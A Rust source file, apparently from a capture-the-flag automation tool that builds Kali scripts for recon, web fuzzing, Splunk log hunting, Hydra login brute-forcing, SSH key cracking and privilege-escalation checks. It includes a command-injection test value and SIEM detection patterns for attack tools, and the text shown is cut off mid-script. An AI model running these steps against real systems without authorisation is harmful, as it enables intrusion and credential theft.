use crate::challenge::Challenge;
use crate::kali::bash_quote;
use crate::osint;
use crate::tools;

#[derive(Clone, Copy, Debug, PartialEq)]
pub enum Workflow {
    Recon,
    WebEnum,
    WebAssess,
    SiemInvestigation,
    VulnAnalysis,
    ExploitPath,
    PwnExploit,
    WebLogin,
    PrivEsc,
    DeepWebScan,
    DeepPrivEsc,
    DefensiveNotes,
    OsintDomain,
    OsintIdentity,
    OsintThreatIntel,
    OsintMetadata,
    OsintFull,
    FullRun,
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::challenge::Challenge;

    #[test]
    fn workflow_quotes_target_before_building_shell_commands() {
        let challenge = Challenge {
            target: "10.10.10.5; whoami".to_string(),
            ..Challenge::default()
        };
        let commands = Workflow::Recon.starter_commands(&challenge);

        assert!(
            commands
                .iter()
                .any(|cmd| cmd.contains("'10.10.10.5; whoami'"))
        );
        assert!(
            !commands
                .iter()
                .any(|cmd| cmd.contains(" 10.10.10.5; whoami"))
        );
    }

    #[test]
    fn recon_is_bounded_and_probes_common_alternate_web_ports() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::Recon.starter_commands(&challenge).join("\n");

        assert!(script.contains("timeout 90s nmap"));
        assert!(script.contains("--version-light"));
        assert!(script.contains("8089"));
        assert!(script.contains("https://$TARGET:8089/"));
        assert!(!script.contains("nmap -sV -O -T4 --reason"));
    }

    #[test]
    fn web_enum_discovers_responsive_bases_before_heavy_directory_fuzzing() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::WebEnum.starter_commands(&challenge).join("\n");

        assert!(script.contains("[mietos-web-base]"));
        assert!(script.contains("responsive web bases"));
        assert!(script.contains("gobuster"));
        assert!(script.contains("https://$TARGET:8089/"));
    }

    #[test]
    fn web_assessment_runs_operator_phases_with_noninteractive_fuzzing() {
        let challenge = Challenge {
            target: "https://example.com/".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::WebAssess.starter_commands(&challenge).join("\n");

        assert!(script.contains("[mietos-phase] web-baseline"));
        assert!(script.contains("[mietos-phase] wordpress-triage"));
        assert!(script.contains("[mietos-phase] content-discovery"));
        assert!(script.contains("[mietos-phase] vulnerability-templates"));
        assert!(script.contains("ffuf"));
        assert!(script.contains("-noninteractive"));
        assert!(script.contains("-of json"));
        assert!(script.contains("-t 12"));
        assert!(script.contains("[mietos-finding]"));
    }

    #[test]
    fn siem_investigation_probes_splunk_services_and_outputs_query_playbook() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::SiemInvestigation
            .starter_commands(&challenge)
            .join("\n");

        assert!(script.contains("8089"));
        assert!(script.contains("Splunk"));
        assert!(script.contains("/services/server/info"));
        assert!(script.contains("EventCode=4688"));
        assert!(script.contains("encodedcommand"));
        assert!(script.contains("[mietos-needs-input]"));
        assert!(script.contains("timeout"));
        assert!(!script.contains("hydra"));
    }

    #[test]
    fn siem_investigation_uses_splunk_credentials_from_notes() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            notes: "Splunk UI creds\nadmin:changeme".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::SiemInvestigation
            .starter_commands(&challenge)
            .join("\n");

        assert!(script.contains("SPLUNK_USER='admin'"));
        assert!(script.contains("SPLUNK_PASS='changeme'"));
        assert!(script.contains("/services/search/jobs/export"));
        assert!(script.contains("march_log_count"));
        assert!(script.contains("[mietos-siem-query]"));
    }

    #[test]
    fn credential_parser_finds_basic_colon_pair() {
        assert_eq!(
            credential_from_notes("Splunk UI creds\nadmin:changeme"),
            Some(("admin".to_string(), "changeme".to_string()))
        );
    }

    #[test]
    fn credential_parser_ignores_index_and_room_metadata() {
        let notes = "Index: win_eventlogs\nEvent ID: 4688\nTime focus: March 2022\nHR: Haroon, Chris, Diana\nCredentials found so far: none";

        assert_eq!(credential_from_notes(notes), None);
    }

    #[test]
    fn siem_investigation_does_not_use_index_as_basic_auth() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            notes: "Index: win_eventlogs\nEvent ID: 4688".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::SiemInvestigation
            .starter_commands(&challenge)
            .join("\n");

        assert!(script.contains("SPLUNK_USER=''"));
        assert!(script.contains("[mietos-needs-input]"));
        assert!(!script.contains("Index:win_eventlogs"));
    }

    #[test]
    fn full_run_does_not_force_siem_workflow_without_siem_wording() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::FullRun.starter_commands(&challenge).join("\n");

        assert!(!script.contains("[mietos] starting SIEM"));
    }

    #[test]
    fn web_login_workflow_includes_hydra_for_authorized_lab_login() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            ..Challenge::default()
        };
        let commands = Workflow::WebLogin.starter_commands(&challenge);

        assert!(commands.iter().any(|cmd| cmd.contains("hydra")));
        assert!(
            commands
                .iter()
                .any(|cmd| cmd.contains("/usr/share/wordlists/rockyou.txt"))
        );
        assert!(commands.iter().any(|cmd| cmd.contains("curl -s")));
    }

    #[test]
    fn web_login_workflow_continues_to_key_crack_and_ssh_flag_collection() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            ..Challenge::default()
        };
        let commands = Workflow::WebLogin.starter_commands(&challenge);
        let script = commands.join("\n");

        assert_eq!(
            commands.len(),
            1,
            "dependent login steps must run in one shell session"
        );
        assert!(script.contains("F=Username or password invalid"));
        assert!(script.contains("admin/panel/id_rsa"));
        assert!(script.contains("ssh2john"));
        assert!(script.contains("john --show"));
        assert!(script.contains("ssh-keygen -p"));
        assert!(script.contains("john@"));
        assert!(script.contains("[mietos-answer]"));
    }

    #[test]
    fn exploit_path_workflow_is_time_bounded() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            ..Challenge::default()
        };
        let commands = Workflow::ExploitPath.starter_commands(&challenge);

        assert!(commands.iter().all(|cmd| cmd.contains("timeout")));
        assert!(
            !commands
                .iter()
                .any(|cmd| cmd == "nmap --script vuln -T3 '10.10.10.5' || true")
        );
    }

    #[test]
    fn exploit_path_avoids_broad_default_safe_nse_scripts_that_crash_kali_nmap() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::ExploitPath
            .starter_commands(&challenge)
            .join("\n");

        assert!(!script.contains("default,safe,vuln"));
        assert!(script.contains("vuln and not broadcast"));
    }

    #[test]
    fn pwn_workflow_extracts_ports_and_local_file_path() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            task_text: "Try to get flag.txt on MACHINE_IP 5002 and http://MACHINE_IP:5555"
                .to_string(),
            notes: r"Local challenge files: C:\Users\Example\Downloads\TryPwnMeTwo".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::PwnExploit.starter_commands(&challenge).join("\n");

        assert!(script.contains("pwn/binary exploitation"));
        assert!(script.contains("PORT_TEXT='5002 5555'"));
        assert!(script.contains("LOCAL_DIR='/mnt/c/Users/Example/Downloads/TryPwnMeTwo'"));
        assert!(script.contains("checksec"));
        assert!(script.contains("pwntools"));
        assert!(script.contains("[mietos-pwn-port-open]"));
    }

    #[test]
    fn privesc_workflow_uses_existing_john_key_artifacts() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::PrivEsc.starter_commands(&challenge).join("\n");

        assert!(script.contains("sudo -l"));
        assert!(script.contains("find / -perm -4000"));
        assert!(script.contains("/etc/shadow"));
        assert!(script.contains("[mietos-answer] root password"));
        assert!(script.contains("[mietos-answer] root.txt"));
        assert!(script.contains("[mietos-answer] root flag"));
    }

    #[test]
    fn deep_web_scan_uses_advanced_tools_with_timeouts() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::DeepWebScan
            .starter_commands(&challenge)
            .join("\n");

        assert!(script.contains("nuclei"));
        assert!(script.contains("feroxbuster"));
        assert!(script.contains("sqlmap"));
        assert!(script.contains("timeout"));
    }

    #[test]
    fn deep_web_scan_skips_heavy_tools_when_no_web_base_responds() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::DeepWebScan
            .starter_commands(&challenge)
            .join("\n");

        assert!(script.contains("No responsive web base found"));
        assert!(script.contains("continue"));
    }

    #[test]
    fn deep_privesc_uses_linpeas_and_pspy_when_available() {
        let challenge = Challenge {
            target: "10.10.10.5".to_string(),
            ..Challenge::default()
        };
        let script = Workflow::DeepPrivEsc
            .starter_commands(&challenge)
            .join("\n");

        assert!(script.contains("linpeas"));
        assert!(script.contains("pspy"));
        assert!(script.contains("timeout"));
    }

    #[test]
    fn osint_workflows_are_available_as_toolcall_workflows() {
        let challenge = Challenge {
            target: "example.com".to_string(),
            ..Challenge::default()
        };

        assert!(
            Workflow::OsintDomain
                .starter_commands(&challenge)
                .join("\n")
                .contains("subfinder")
        );
        assert!(
            Workflow::OsintThreatIntel
                .starter_commands(&challenge)
                .join("\n")
                .contains("otx.alienvault.com")
        );
        assert_eq!(Workflow::OsintFull.starter_commands(&challenge).len(), 2);
    }
}

impl Workflow {
    pub fn label(&self) -> &'static str {
        match self {
            Self::Recon => "Recon",
            Self::WebEnum => "Web Enum",
            Self::WebAssess => "Web Assessment",
            Self::SiemInvestigation => "SIEM Investigation",
            Self::VulnAnalysis => "Vuln Analysis",
            Self::ExploitPath => "Exploit Path",
            Self::PwnExploit => "Pwn / Binary Exploit",
            Self::WebLogin => "Web Login",
            Self::PrivEsc => "Privilege Escalation",
            Self::DeepWebScan => "Deep Web Scan",
            Self::DeepPrivEsc => "Deep PrivEsc",
            Self::DefensiveNotes => "Defensive Notes",
            Self::OsintDomain => "OSINT Domain Surface",
            Self::OsintIdentity => "OSINT Identity Footprint",
            Self::OsintThreatIntel => "OSINT Threat Intel",
            Self::OsintMetadata => "OSINT Metadata",
            Self::OsintFull => "Full OSINT Run",
            Self::FullRun => "Full Challenge Run",
        }
    }

    pub fn starter_commands(&self, challenge: &Challenge) -> Vec<String> {
        let target = challenge.target.trim();
        if target.is_empty() {
            return Vec::new();
        }
        let host = bash_quote(&target_host(target));
        let url = bash_quote(&http_url(target));
        match self {
            Self::Recon => vec![recon_command(&target_host(target))],
            Self::WebEnum => vec![web_enum_command(&target_host(target))],
            Self::WebAssess => vec![web_assessment_command(target)],
            Self::SiemInvestigation => {
                vec![siem_investigation_command(
                    &target_host(target),
                    &challenge.notes,
                )]
            }
            Self::VulnAnalysis => vec![format!("nikto -host {url} -nointeractive || true")],
            Self::ExploitPath => vec![
                format!(
                    "timeout 180s nmap -sV --script 'vuln and not broadcast' -T3 --max-retries 2 --host-timeout 3m {host} || true"
                ),
                format!(
                    "searchsploit --nmap <(timeout 90s nmap -sV -oX - {host}) 2>/dev/null || true"
                ),
            ],
            Self::PwnExploit => vec![pwn_exploit_command(
                &target_host(target),
                &challenge.task_text,
                &challenge.notes,
            )],
            Self::WebLogin => vec![web_login_chain_command(&target_host(target))],
            Self::PrivEsc => vec![privesc_chain_command(&target_host(target))],
            Self::DeepWebScan => vec![deep_web_scan_command(&target_host(target))],
            Self::DeepPrivEsc => vec![deep_privesc_command(&target_host(target))],
            Self::DefensiveNotes => vec![format!("nmap -sV --script banner {host} || true")],
            Self::OsintDomain => vec![osint::domain_surface_command(&target_host(target))],
            Self::OsintIdentity => vec![osint::identity_footprint_command(&target_host(target))],
            Self::OsintThreatIntel => vec![osint::threat_intel_command(&target_host(target))],
            Self::OsintMetadata => vec![osint::metadata_triage_command(target)],
            Self::OsintFull => osint::full_osint_commands(&target_host(target)),
            Self::FullRun => vec![
                recon_command(&target_host(target)),
                web_enum_command(&target_host(target)),
                web_login_chain_command(&target_host(target)),
                privesc_chain_command(&target_host(target)),
            ],
        }
    }
}

fn web_assessment_command(target: &str) -> String {
    let base = bash_quote(&http_url(target));
    let host = bash_quote(&target_host(target));
    let script = r#"set -u
BASE=__MIETOS_BASE_URL__
HOST=__MIETOS_TARGET_HOST__
SAFE_HOST="$(printf '%s' "$HOST" | tr -c 'A-Za-z0-9._-' '_')"
WORK="/tmp/mietos-web-$SAFE_HOST"
mkdir -p "$WORK"
echo "[mietos] web assessment for $BASE"

echo "[mietos-phase] web-baseline"
curl -k -sS -L --max-time 12 -D "$WORK/headers.txt" -o "$WORK/body.html" "$BASE" || true
sed -n '1,40p' "$WORK/headers.txt" | sed 's/^/[mietos-header] /' || true
python3 - "$WORK/body.html" <<'PY' || true
import re, sys
text = open(sys.argv[1], errors="ignore").read() if len(sys.argv) > 1 else ""
title = re.search(r"<title[^>]*>(.*?)</title>", text, re.I | re.S)
if title:
    print("[mietos-finding] page title = " + re.sub(r"\s+", " ", title.group(1)).strip()[:180])
for pattern, label in [
    (r"wp-content/themes/([^/'\"?]+)", "wordpress theme"),
    (r"wp-content/plugins/([^/'\"?]+)", "wordpress plugin"),
    (r"https?://[^'\"<> ]+", "external url"),
]:
    seen = []
    for hit in re.findall(pattern, text, re.I):
        value = hit if isinstance(hit, str) else hit[0]
        if value not in seen:
            seen.append(value)
    for value in seen[:20]:
        print(f"[mietos-finding] {label} = {value}")
PY

echo "[mietos-phase] wordpress-triage"
for path in wp-login.php wp-admin/ wp-json/ wp-content/ wp-content/uploads/ robots.txt sitemap.xml; do
  code="$(curl -k -sS -L --max-time 8 -o "$WORK/path-${path//\//_}.txt" -w '%{http_code}' "$BASE$path" 2>/dev/null || true)"
  if [ "$code" != "000" ]; then
    echo "[mietos-finding] path $path http_code=$code"
    sed -n '1,8p' "$WORK/path-${path//\//_}.txt" | sed "s/^/[mietos-snippet] $path /" || true
  fi
done

echo "[mietos-phase] redirect-and-ad-injection"
grep -Eio 'https?://[^"'\''<> ]+' "$WORK/body.html" 2>/dev/null \
  | sort -u \
  | grep -Eiv "$HOST|google|gstatic|schema.org|wordpress.org|w.org|facebook|instagram" \
  | head -40 \
  | sed 's/^/[mietos-finding] unusual external reference = /' || true
grep -Eio '(eval\(|atob\(|document\.write|unescape\(|fromCharCode|window\.location|location\.href)' "$WORK/body.html" 2>/dev/null \
  | sort -u | sed 's/^/[mietos-finding] suspicious script pattern = /' || true

echo "[mietos-phase] content-discovery"
if command -v ffuf >/dev/null 2>&1 && [ -f /usr/share/wordlists/dirb/common.txt ]; then
  timeout -k 5s 90s ffuf -u "${BASE%/}/FUZZ" -w /usr/share/wordlists/dirb/common.txt \
    -mc 200,204,301,302,307,401,403 -t 12 -timeout 6 -noninteractive -of json -o "$WORK/ffuf.json" \
    | sed -n '1,80p' || true
  python3 - "$WORK/ffuf.json" <<'PY' || true
import json, sys
try:
    data = json.load(open(sys.argv[1], errors="ignore"))
except Exception:
    data = {}
for item in data.get("results", [])[:80]:
    url = item.get("url") or item.get("input", {}).get("FUZZ", "")
    status = item.get("status")
    length = item.get("length")
    print(f"[mietos-finding] discovered path status={status} length={length} url={url}")
PY
else
  echo "[mietos-missing-tool] ffuf or /usr/share/wordlists/dirb/common.txt"
fi

echo "[mietos-phase] vulnerability-templates"
if command -v nuclei >/dev/null 2>&1; then
  timeout -k 5s 90s nuclei -u "$BASE" -severity low,medium,high,critical -silent -no-color \
    | sed 's/^/[mietos-finding] nuclei = /' | tee "$WORK/nuclei.txt" || true
else
  echo "[mietos-missing-tool] nuclei"
fi

echo "[mietos] web assessment finished; reports in $WORK"
"#;
    script
        .replace("__MIETOS_BASE_URL__", &base)
        .replace("__MIETOS_TARGET_HOST__", &host)
}

fn pwn_exploit_command(host: &str, task_text: &str, notes: &str) -> String {
    let quoted_host = bash_quote(host);
    let ports = pwn_ports(task_text, notes)
        .into_iter()
        .map(|port| port.to_string())
        .collect::<Vec<_>>()
        .join(" ");
    let quoted_ports = bash_quote(&ports);
    let local_dir = local_challenge_dir(notes)
        .map(|path| tools::windows_path_to_wsl_path(&path))
        .unwrap_or_default();
    let quoted_local_dir = bash_quote(&local_dir);
    let script = r#"set -u
TARGET=__MIETOS_TARGET__
PORT_TEXT=__MIETOS_PWN_PORTS__
LOCAL_DIR=__MIETOS_LOCAL_DIR__
WORK="/tmp/mietos-pwn-$TARGET"
mkdir -p "$WORK"
echo "[mietos] pwn/binary exploitation workflow for $TARGET"
echo "[mietos] remote pwn ports: ${PORT_TEXT:-none-detected}"

echo "[mietos] checking pwn tooling"
for tool in python3 file strings readelf objdump gdb checksec ROPgadget ropper nc socat; do
  if command -v "$tool" >/dev/null 2>&1; then
    echo "[mietos-pwn-tool-ok] $tool"
  else
    echo "[mietos-missing-tool] $tool"
  fi
done
python3 - <<'PY' 2>/dev/null && echo "[mietos-pwn-tool-ok] pwntools" || echo "[mietos-missing-tool] python3-pwntools"
import pwn
PY

if [ -n "$LOCAL_DIR" ]; then
  echo "[mietos] local challenge files: $LOCAL_DIR"
  if [ -d "$LOCAL_DIR" ]; then
    find "$LOCAL_DIR" -maxdepth 2 -type f | while IFS= read -r f; do
      echo "[mietos-pwn-file] $f"
      file "$f" || true
      if file "$f" | grep -Eiq 'ELF|executable'; then
        echo "[mietos-pwn-checksec] $f"
        if command -v checksec >/dev/null 2>&1; then
          checksec --file="$f" 2>/dev/null || checksec "$f" 2>/dev/null || true
        else
          python3 -m pwn checksec "$f" 2>/dev/null || true
        fi
        echo "[mietos-pwn-strings] $f"
        strings -a "$f" | grep -E 'flag|/bin/sh|system|puts|printf|gets|scanf|read|win|shell|THM\{' | head -80 || true
        echo "[mietos-pwn-relro-nx-pie] $f"
        readelf -h "$f" 2>/dev/null | sed -n '1,25p' || true
        echo "[mietos-pwn-symbols] $f"
        objdump -t "$f" 2>/dev/null | grep -E ' win| shell| system| printf| gets| main| flag' | head -80 || true
        if command -v ROPgadget >/dev/null 2>&1; then
          ROPgadget --binary "$f" --only 'ret|pop|syscall' 2>/dev/null | head -60 || true
        elif command -v ropper >/dev/null 2>&1; then
          ropper --file "$f" --search 'ret' 2>/dev/null | head -40 || true
        fi
      fi
    done
  else
    echo "[mietos-needs-input] Local challenge file directory was provided but is not reachable from Kali: $LOCAL_DIR"
  fi
else
  echo "[mietos-needs-input] Add local challenge files in Notes as: Local challenge files: C:\\path\\to\\TryPwnMeTwo"
fi

if [ -n "$PORT_TEXT" ]; then
  for port in $PORT_TEXT; do
    echo "[mietos-pwn-remote] probing $TARGET:$port"
    timeout 5s bash -lc "cat < /dev/null > /dev/tcp/$TARGET/$port" >/dev/null 2>&1 \
      && echo "[mietos-pwn-port-open] $port" \
      || echo "[mietos-pwn-port-closed-or-timeout] $port"
    timeout 6s nc -nv "$TARGET" "$port" </dev/null 2>&1 | sed -n '1,20p' || true
  done
else
  echo "[mietos-needs-input] No pwn ports found in task text. Add ports in task text or notes, e.g. MACHINE_IP:5000."
fi

cat <<'EOF'
[mietos-pwn-guidance] For each binary: confirm architecture, protections, input path, vuln class, offset, useful symbols/gadgets, and remote port.
[mietos-pwn-guidance] Common next commands: cyclic crash in gdb, format-string leak with pwntools, ret2win/ret2libc with an extra ret gadget for Ubuntu stack alignment.
[mietos-pwn-guidance] Keep outputs compact: offset, binary path, port, exploit primitive, payload proof, and exact flag.txt value.
EOF

echo "[mietos] pwn workflow finished"
"#;
    script
        .replace("__MIETOS_TARGET__", &quoted_host)
        .replace("__MIETOS_PWN_PORTS__", &quoted_ports)
        .replace("__MIETOS_LOCAL_DIR__", &quoted_local_dir)
}

fn pwn_ports(task_text: &str, notes: &str) -> Vec<u16> {
    let text = format!("{task_text}\n{notes}");
    let mut ports = Vec::new();
    let mut current = String::new();
    for ch in text.chars().chain(std::iter::once(' ')) {
        if ch.is_ascii_digit() {
            current.push(ch);
            continue;
        }
        if let Ok(port) = current.parse::<u16>() {
            if (1024..=65535).contains(&port) && !ports.contains(&port) {
                ports.push(port);
            }
        }
        current.clear();
    }
    ports
}

fn local_challenge_dir(notes: &str) -> Option<String> {
    let mut expect_next = false;
    for line in notes.lines() {
        let trimmed = line.trim();
        if expect_next && !trimmed.is_empty() {
            return Some(trimmed.to_string());
        }
        let lower = trimmed.to_ascii_lowercase();
        if lower.starts_with("local challenge files:") || lower.starts_with("challenge files:") {
            let (_, right) = trimmed.split_once(':')?;
            let value = right.trim();
            if !value.is_empty() {
                return Some(value.to_string());
            }
            expect_next = true;
        }
    }
    None
}

fn recon_command(host: &str) -> String {
    let quoted_host = bash_quote(host);
    let script = r#"set -u
TARGET=__MIETOS_TARGET__
echo "[mietos] bounded recon for $TARGET"
timeout 90s nmap -Pn -sV --version-light -O --osscan-limit -T4 --max-retries 1 --host-timeout 90s --reason "$TARGET" || true
echo "[mietos] quick service probes across common web/SIEM ports"
for url in \
  "http://$TARGET/" "https://$TARGET/" \
  "http://$TARGET:8000/" "https://$TARGET:8000/" \
  "http://$TARGET:8080/" "https://$TARGET:8080/" \
  "http://$TARGET:8089/" "https://$TARGET:8089/" \
  "http://$TARGET:8443/" "https://$TARGET:8443/"; do
  code="$(curl -k -sS -m 3 -o /tmp/mietos-probe-body -w '%{http_code}' "$url" 2>/dev/null || true)"
  if [ "$code" != "000" ]; then
    echo "[mietos-web-base] $url http_code=$code"
    sed -n '1,8p' /tmp/mietos-probe-body 2>/dev/null || true
  else
    echo "[mietos-web-timeout] $url"
  fi
done
"#;
    script.replace("__MIETOS_TARGET__", &quoted_host)
}

fn web_enum_command(host: &str) -> String {
    let quoted_host = bash_quote(host);
    let script = r#"set -u
TARGET=__MIETOS_TARGET__
WORK="/tmp/mietos-$TARGET"
mkdir -p "$WORK"
BASES="$WORK/web-bases.txt"
: > "$BASES"
echo "[mietos] discovering responsive web bases for $TARGET"
for url in \
  "http://$TARGET/" "https://$TARGET/" \
  "http://$TARGET:8000/" "https://$TARGET:8000/" \
  "http://$TARGET:8080/" "https://$TARGET:8080/" \
  "http://$TARGET:8089/" "https://$TARGET:8089/" \
  "http://$TARGET:8443/" "https://$TARGET:8443/"; do
  code="$(curl -k -sS -m 4 -o /dev/null -w '%{http_code}' "$url" 2>/dev/null || true)"
  if [ "$code" != "000" ]; then
    echo "[mietos-web-base] $url http_code=$code"
    printf '%s\n' "$url" >> "$BASES"
  fi
done

if [ ! -s "$BASES" ]; then
  echo "[mietos] No responsive web base found; skipping directory fuzzing."
  exit 0
fi

while read -r BASE; do
  echo "[mietos] enumerating $BASE"
  timeout 45s whatweb "$BASE" || true
  timeout 90s gobuster dir -u "$BASE" -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 10 --timeout 4s -q || true
done < "$BASES"
"#;
    script.replace("__MIETOS_TARGET__", &quoted_host)
}

fn siem_investigation_command(host: &str, notes: &str) -> String {
    let quoted_host = bash_quote(host);
    let (splunk_user, splunk_pass) = credential_from_notes(notes).unwrap_or_default();
    let quoted_user = bash_quote(&splunk_user);
    let quoted_pass = bash_quote(&splunk_pass);
    let script = r#"set -u
TARGET=__MIETOS_TARGET__
SPLUNK_USER=__MIETOS_SPLUNK_USER__
SPLUNK_PASS=__MIETOS_SPLUNK_PASS__
WORK="/tmp/mietos-$TARGET"
mkdir -p "$WORK"
echo "[mietos] starting SIEM/log investigation workflow for $TARGET"

echo "[mietos] checking common SIEM/Splunk ports"
timeout 35s nmap -Pn -sV --version-light -p 80,443,8000,8089,9997 --max-retries 1 --host-timeout 35s "$TARGET" || true
for port in 80 443 8000 8089 9997; do
  timeout 4s bash -lc "cat < /dev/null > /dev/tcp/$TARGET/$port" >/dev/null 2>&1 \
    && echo "[mietos-port-open] $port" \
    || echo "[mietos-port-closed-or-timeout] $port"
done

echo "[mietos] probing Splunk/UI surfaces without credentials"
for url in \
  "http://$TARGET/" "https://$TARGET/" \
  "http://$TARGET:8000/" "https://$TARGET:8000/" \
  "http://$TARGET:8089/" "https://$TARGET:8089/"; do
  echo "[mietos-siem-probe] $url"
  timeout 8s curl -k -sS -i --max-time 6 "$url" 2>&1 | sed -n '1,40p' || true
done

echo "[mietos] probing Splunk management REST endpoints; 401/403 is useful evidence"
for endpoint in /services/server/info /services/authentication/current-context /services/data/indexes; do
  url="https://$TARGET:8089$endpoint?output_mode=json"
  echo "[mietos-splunk-rest-probe] $url"
  timeout 8s curl -k -sS -i --max-time 6 "$url" 2>&1 | sed -n '1,60p' || true
done

if [ -n "$SPLUNK_USER" ] && [ -n "$SPLUNK_PASS" ]; then
  echo "[mietos] Splunk credentials detected in Notes; running bounded REST searches"
  declare -a SEARCHES=(
    'search index=* earliest=03/01/2022:00:00:00 latest=04/01/2022:00:00:00 | stats count as march_log_count'
    'search index=* (EventCode=4688 OR process=* OR CommandLine=* OR commandline=*) (certutil OR bitsadmin OR powershell OR mshta OR rundll32 OR regsvr32 OR curl OR wget) | table _time host user process parent_process CommandLine commandline dest url | head 40'
    'search index=* ("schtasks" OR "scheduled task" OR "Task Scheduler" OR EventCode=4698 OR EventCode=4702) | table _time host user EventCode TaskName CommandLine commandline | head 40'
    'search index=* ("THM{" OR "http://" OR "https://" OR ".exe" OR ".ps1") | table _time host user process CommandLine commandline src dest url uri file_name | head 80'
    'search index=* | stats count by host user process CommandLine commandline dest url uri file_name | sort - count | head 80'
  )
  idx=0
  for search in "${SEARCHES[@]}"; do
    idx=$((idx+1))
    echo "[mietos-siem-query] $search"
    timeout 45s curl -k -sS --max-time 40 -u "$SPLUNK_USER:$SPLUNK_PASS" \
      https://$TARGET:8089/services/search/jobs/export \
      --data-urlencode "search=$search" \
      -d output_mode=json \
      | tee "$WORK/splunk-query-$idx.json" \
      | sed -n '1,120p' || true
  done
  grep -Rho 'THM{[^}]*}' "$WORK"/splunk-query-*.json 2>/dev/null | head -5 | sed 's/^/[mietos-answer] siem flag = /' || true
else
  echo "[mietos-needs-input] SIEM task needs Splunk/API credentials, UI access details, or exported log results. Paste them into Notes, then rerun SIEM Investigation."
fi

cat <<'EOF'
[mietos-siem-guidance] This looks like a SIEM/log investigation task, not a normal web exploit path.
[mietos-siem-guidance] If the room gives Splunk/UI credentials, investigate with searches like:
index=* earliest=-30d | stats count by host sourcetype source
index=* ("powershell" OR "cmd.exe" OR "rundll32" OR "encodedcommand" OR "mimikatz" OR "empire" OR "meterpreter") | table _time host user process commandline
index=* sourcetype=WinEventLog* (EventCode=4688 OR EventCode=4624 OR EventCode=4625 OR EventCode=7045 OR EventCode=1102) | table _time host user EventCode process commandline
index=* | stats count by src_ip dest_ip dest_port host
index=* (".exe" OR ".ps1" OR ".dll") | stats count by host user process commandline
[mietos-siem-guidance] Goal: identify the infected host, suspicious user/process, timeline, C2/destination, persistence, and final flag/evidence requested by the task.
EOF

echo "[mietos] SIEM/log investigation workflow finished"
"#;
    script
        .replace("__MIETOS_TARGET__", &quoted_host)
        .replace("__MIETOS_SPLUNK_USER__", &quoted_user)
        .replace("__MIETOS_SPLUNK_PASS__", &quoted_pass)
}

fn credential_from_notes(notes: &str) -> Option<(String, String)> {
    for line in notes.lines() {
        let lower = line.to_ascii_lowercase();
        if lower.contains("http://") || lower.contains("https://") {
            continue;
        }
        if is_metadata_note_line(&lower) {
            continue;
        }
        if let Some((left, right)) = line.split_once(':') {
            if is_metadata_key(left) {
                continue;
            }
            let user = left
                .trim()
                .trim_start_matches("splunk")
                .trim_start_matches("username")
                .trim_start_matches("user")
                .trim_matches(|ch: char| ch == '=' || ch.is_whitespace())
                .trim();
            let pass = right
                .trim()
                .trim_start_matches("password")
                .trim_start_matches("pass")
                .trim_matches(|ch: char| ch == '=' || ch.is_whitespace())
                .trim();
            if looks_like_credential_part(user) && looks_like_credential_part(pass) {
                return Some((user.to_string(), pass.to_string()));
            }
        }
    }
    None
}

fn is_metadata_note_line(lower: &str) -> bool {
    lower.starts_with("index:")
        || lower.starts_with("event id:")
        || lower.starts_with("eventid:")
        || lower.starts_with("time focus:")
        || lower.starts_with("it:")
        || lower.starts_with("hr:")
        || lower.starts_with("marketing:")
        || lower.starts_with("room:")
        || lower.starts_with("target:")
        || lower.starts_with("vpn connected:")
        || lower.starts_with("credentials found so far:")
        || lower.starts_with("flags found so far:")
        || lower.starts_with("useful paths")
}

fn is_metadata_key(key: &str) -> bool {
    matches!(
        key.trim().to_ascii_lowercase().as_str(),
        "index"
            | "event id"
            | "eventid"
            | "time focus"
            | "it"
            | "hr"
            | "marketing"
            | "room"
            | "target"
            | "vpn connected"
            | "credentials found so far"
            | "flags found so far"
    )
}

fn looks_like_credential_part(text: &str) -> bool {
    !text.is_empty()
        && text.len() <= 80
        && !text.contains('/')
        && !text.contains(' ')
        && !text.contains("://")
}

fn deep_web_scan_command(host: &str) -> String {
    let quoted_host = bash_quote(host);
    let script = r#"set -u
TARGET=__MIETOS_TARGET__
WORK="/tmp/mietos-$TARGET"
mkdir -p "$WORK"
BASES="$WORK/web-bases.txt"
: > "$BASES"
echo "[mietos] finding responsive web bases before deep scan for $TARGET"
for url in \
  "http://$TARGET/" "https://$TARGET/" \
  "http://$TARGET:8000/" "https://$TARGET:8000/" \
  "http://$TARGET:8080/" "https://$TARGET:8080/" \
  "http://$TARGET:8089/" "https://$TARGET:8089/" \
  "http://$TARGET:8443/" "https://$TARGET:8443/"; do
  code="$(curl -k -sS -m 4 -o /dev/null -w '%{http_code}' "$url" 2>/dev/null || true)"
  if [ "$code" != "000" ]; then
    echo "[mietos-web-base] $url http_code=$code"
    printf '%s\n' "$url" >> "$BASES"
  fi
done

if [ ! -s "$BASES" ]; then
  echo "[mietos] No responsive web base found; continue with non-web workflows."
  exit 0
fi

while read -r BASE; do
echo "[mietos] starting deep web scan for $BASE"

if command -v feroxbuster >/dev/null 2>&1; then
  timeout 120s feroxbuster -u "$BASE" -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 12 --depth 1 -x php,txt,html,js -k -q \
    | tee "$WORK/feroxbuster.txt" || true
